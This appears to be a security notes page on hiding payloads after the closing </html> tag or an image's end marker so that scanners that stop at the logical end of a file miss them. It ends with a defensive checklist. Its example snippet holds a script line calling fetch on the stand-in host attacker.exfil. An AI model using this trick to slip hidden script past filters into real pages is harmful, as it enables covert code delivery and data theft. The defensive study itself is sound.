# Invisible Gutters

**Target:** Exploiting trailing data zones. The physical End-of-File (EOF) is rarely the logical end of a data structure; appending raw streams post-`</html>` leaves data perfectly intact for network tools while hidden from basic DOM views.

---

## The anatomy of "the invisible gutter"

When a standard parser reads an HTML document, it stops caring about the layout tree once it hits `</html>`. However, network tools (`curl`, `wget`) and basic file readers (`open().read()`) don't care about tags — they stream bytes until they hit the actual end-of-file (EOF) delimiter.

This creates a blind spot: the space between the logical end of a document and the physical end of the file.

---

## The browser's choice vs. the smuggling space

**The Browser's Choice:** If a browser hits non-whitespace text after the `</html>` tag, its error-recovery state machine forces an implicit fallback, automatically dragging that content back up into the `<body>` element so a user can see it.

**The Smuggling Space:** If you hide comments, JSON blobs, or secondary payloads after `</html>`, many static scanners or backend regex engines only sample up to the closing tag to save time, allowing active code to bypass filters and sit completely intact in the raw TCP stream or file cache.

---

## Parallels to binary and image formats

Most file formats are fundamentally structured as either length-prefixed blocks or sentinel-terminated streams:

- A PNG has an `IEND` chunk.
- A JPEG has an EOI (End of Image) marker (`FF D9`).
- An HTML document has `</html>`.

In all three cases, if an automated pipeline validates a file based only on its internal semantic markers and ignores the physical size of the file on disk, an attacker can append megabytes of raw data, secondary scripts, or alternate archives into the "trailing gutter." The image processor strips it during transcoding, but a raw storage mechanism or a different parser down the pipeline will find it intact.

---

## "The browser is the only polite one in the room"

Modern web browsers carry 30 years of backward-compatibility baggage. They are designed to render "forgiving soup" because the early web was full of broken tags.

A Python script running BeautifulSoup, lxml, or a fast regex tokenizer won't handle trailing data or malformed tree construction the same way a headless rendering engine will. If a scraper uses a lightweight library to scan for strings, it will miss the smuggled payload; if it then passes that raw string to a browser environment, the browser will obediently execute the trailing JavaScript or parse errors.

---

## Practical exploitation

```html
<!DOCTYPE html>
<html>
<head><title>Safe Page</title></head>
<body>Completely benign content.</body>
</html>
<!-- 
{"secondary_payload": "..."}
<script>/* fetch('https://attacker.exfil') */</script>
-->
```

A regex-based scanner looking for `<script>` tags might stop at `</html>`. A DOM-based sanitizer might not serialize the trailing content. But the raw HTTP response contains the full payload, ready for any tool that reads past the logical document end.

---

## Defensive checklist

- Do not assume `</html>` means end-of-content. Always process the full byte stream.
- Use parsers that consume the entire file, not just the logical document tree.
- For HTML, run a second pass that checks for trailing data after the document element.
- For images, verify that the physical file size matches the sum of all chunks/segments.
- Treat any file with trailing data as suspicious until proven otherwise.

---

## Related files

- [[Wrapping-Wrappers]] — polyglot file format exploitation.
- [[Adoption-Agency-Harness]] — DOM tree reconstruction attacks.
